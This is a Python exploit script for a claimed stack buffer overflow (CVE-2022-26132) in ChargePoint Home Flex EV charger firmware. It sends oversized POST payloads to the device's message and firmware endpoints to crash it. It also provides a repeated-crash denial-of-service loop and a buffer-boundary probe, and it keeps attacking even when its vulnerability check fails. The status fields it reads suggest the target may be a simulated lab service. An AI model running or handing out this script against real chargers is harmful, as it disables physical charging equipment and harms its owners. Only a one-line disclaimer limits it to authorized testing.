#!/usr/bin/env python3
"""
CVE-2022-26132 Exploit - ChargePoint Home Flex Stack Buffer Overflow (DoS)

This exploit targets the stack buffer overflow vulnerability in
ChargePoint Home Flex firmware that causes denial of service.

Target: ChargePoint Home Flex firmware <= 1.0.0.31
Impact: Device crash (DoS), potential code execution

Usage:
    python3 cve_2022_26132_chargepoint_dos.py <target_ip> <port>
    python3 cve_2022_26132_chargepoint_dos.py 192.168.1.100 8084

DISCLAIMER: For authorized security testing only.
"""

import argparse
import requests
import sys
import time


class ChargePointExploit:
    def __init__(self, target: str, port: int):
        self.base_url = f"http://{target}:{port}"
        self.buffer_size = 1024  # Known vulnerable buffer size
        
    def check_vulnerable(self) -> bool:
        """Check if target is vulnerable"""
        print(f"[*] Checking target: {self.base_url}")
        try:
            resp = requests.get(f"{self.base_url}/status", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                print(f"[+] Target found!")
                print(f"    Vendor: {data.get('vendor')}")
                print(f"    Model: {data.get('model')}")
                print(f"    Firmware: {data.get('firmware')}")
                print(f"    Buffer size: {data.get('vulnerable_buffer_size')} bytes")
                print(f"    Crash count: {data.get('crash_count')}")
                
                if data.get('vulnerable_buffer_size'):
                    self.buffer_size = data.get('vulnerable_buffer_size')
                    print("[+] Target is VULNERABLE to CVE-2022-26132!")
                    return True
            return False
        except requests.exceptions.RequestException as e:
            print(f"[-] Connection error: {e}")
            return False
    
    def trigger_overflow(self, payload_size: int = None) -> bool:
        """
        Trigger stack buffer overflow by sending oversized payload
        """
        if payload_size is None:
            payload_size = self.buffer_size + 512  # Exceed buffer
        
        print(f"\n[*] Sending payload of {payload_size} bytes (buffer is {self.buffer_size})...")
        
        # Create overflow payload
        # Pattern: 'A' * size + potential return address overwrite
        payload = b'A' * payload_size
        
        # Add some structure for potential exploitation
        # (in real exploit, this would be shellcode + ret address)
        if payload_size > self.buffer_size + 8:
            payload = payload[:-8] + b'DEADBEEF'  # Simulated return address
        
        try:
            resp = requests.post(
                f"{self.base_url}/api/message",
                data=payload,
                timeout=10,
                headers={'Content-Type': 'application/octet-stream'}
            )
            
            if resp.status_code == 500:
                data = resp.json()
                if data.get('error') == 'STACK_BUFFER_OVERFLOW':
                    print("[+] BUFFER OVERFLOW TRIGGERED!")
                    print(f"    Message size: {data.get('message_size')}")
                    print(f"    Buffer size: {data.get('buffer_size')}")
                    print(f"    Device status: {data.get('status')}")
                    print(f"    Total crash count: {data.get('crash_count')}")
                    return True
            
            print(f"[-] Unexpected response: {resp.status_code}")
            return False
            
        except requests.exceptions.ReadTimeout:
            print("[+] Device crashed! (connection timeout)")
            return True
        except requests.exceptions.ConnectionError:
            print("[+] Device crashed! (connection refused)")
            return True
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def firmware_overflow(self) -> bool:
        """Trigger overflow via firmware update endpoint"""
        print("\n[*] Attempting firmware handler overflow...")
        
        # Firmware updates often have larger but still bounded buffers
        payload_size = self.buffer_size * 15
        payload = b'F' * payload_size
        
        try:
            resp = requests.post(
                f"{self.base_url}/api/firmware",
                data=payload,
                timeout=30,
                headers={'Content-Type': 'application/octet-stream'}
            )
            
            if resp.status_code == 500:
                print("[+] Firmware handler crashed!")
                return True
            
            return False
            
        except Exception as e:
            print(f"[+] Device crashed: {e}")
            return True
    
    def dos_loop(self, count: int = 5, delay: float = 2.0):
        """Repeatedly crash the device"""
        print(f"\n[*] Starting DoS loop ({count} iterations, {delay}s delay)...")
        
        successes = 0
        for i in range(count):
            print(f"\n--- Attempt {i+1}/{count} ---")
            
            if self.trigger_overflow():
                successes += 1
            
            if i < count - 1:
                print(f"[*] Waiting {delay}s for device recovery...")
                time.sleep(delay)
        
        print(f"\n[*] DoS complete: {successes}/{count} successful crashes")
    
    def probe_buffer_size(self):
        """Probe to find exact buffer size"""
        print("\n[*] Probing for exact buffer overflow boundary...")
        
        test_sizes = [512, 768, 1024, 1280, 1536, 2048, 4096]
        vulnerable_at = None
        
        for size in test_sizes:
            print(f"\n[*] Testing size: {size} bytes...")
            try:
                resp = requests.post(
                    f"{self.base_url}/api/message",
                    data=b'X' * size,
                    timeout=5
                )
                
                if resp.status_code == 500:
                    vulnerable_at = size
                    print(f"[+] Crash at {size} bytes!")
                    break
                else:
                    print(f"    OK at {size} bytes")
                    
            except Exception:
                vulnerable_at = size
                print(f"[+] Device unresponsive at {size} bytes!")
                break
            
            time.sleep(1)
        
        if vulnerable_at:
            print(f"\n[+] Buffer overflow occurs around {vulnerable_at} bytes")
            print(f"[+] Actual buffer likely ~{vulnerable_at - 256} to {vulnerable_at} bytes")


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2022-26132 - ChargePoint Home Flex Buffer Overflow DoS"
    )
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("port", type=int, default=8084, nargs='?', help="Target port (default: 8084)")
    parser.add_argument("--size", type=int, help="Custom payload size")
    parser.add_argument("--dos", action="store_true", help="Run DoS loop")
    parser.add_argument("--count", type=int, default=5, help="DoS loop count")
    parser.add_argument("--probe", action="store_true", help="Probe buffer size")
    parser.add_argument("--firmware", action="store_true", help="Target firmware handler")
    
    args = parser.parse_args()
    
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║  CVE-2022-26132 - ChargePoint Home Flex Buffer Overflow  ║
    ║  Stack-based buffer overflow causing DoS                  ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    exploit = ChargePointExploit(args.target, args.port)
    
    if not exploit.check_vulnerable():
        print("[-] Target may not be vulnerable, continuing anyway...")
    
    if args.probe:
        exploit.probe_buffer_size()
    elif args.firmware:
        exploit.firmware_overflow()
    elif args.dos:
        exploit.dos_loop(count=args.count)
    else:
        # Single overflow attempt
        exploit.trigger_overflow(payload_size=args.size)


if __name__ == "__main__":
    main()
